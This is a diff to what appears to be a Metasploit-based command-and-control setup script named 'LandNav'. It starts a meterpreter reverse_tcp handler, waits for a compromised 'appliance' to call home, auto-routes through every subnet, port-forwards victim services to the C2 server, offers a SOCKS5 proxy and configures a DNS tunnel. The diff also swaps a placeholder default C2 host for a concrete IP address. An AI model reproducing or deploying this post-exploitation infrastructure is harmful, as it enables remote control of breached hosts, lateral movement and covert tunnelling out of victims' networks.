@@ -4,8 +4,8 @@
 # Starts a python/meterpreter/reverse_tcp handler on :4443.
 # On session open, automatically:
 #   1. Adds routes for all subnets (autoroute)
-#   2. Port-forwards beretta services to c2-server high ports
-#      (c2-server hosts its own Vantage/Crucible/Nessus on the standard ports)
+#   2. Port-forwards appliance services to C2 server high ports
+#      (C2 server hosts its own Vantage/Crucible/Nessus on the standard ports)
 #
 # SOCKS proxy is available on :1080 but prefer the port forwards —
 # Python meterpreter is single-threaded and heavy SOCKS browsing
@@ -61,7 +61,7 @@ if dns_cfg.fetch('enabled', true)
         ns_out = `dig +short NS #{domain} 2>/dev/null`.strip
         if ns_out.empty?
           print_line("[!] No NS delegation for #{domain}")
-          c2_host = (cfg['c2'] || {})['host'] || 'c2.example.com'
+          c2_host = (cfg['c2'] || {})['host'] || '66.194.172.172'
           print_line("[!]   Add at domain registrar: #{domain}. IN NS #{c2_host}.")
           print_line("[!]   DNS tunnel will fail until delegation is set up")
         else
@@ -268,6 +268,6 @@ echo ""
 echo "════════════════════════════════════════════════════"
 echo " LandNav listener active on 10.20.70.172:4443"
 echo " SOCKS5 proxy on :1080 (routes through sessions)"
-echo " Waiting for beretta call-home..."
+echo " Waiting for appliance call-home..."
 echo "════════════════════════════════════════════════════"
 echo ""
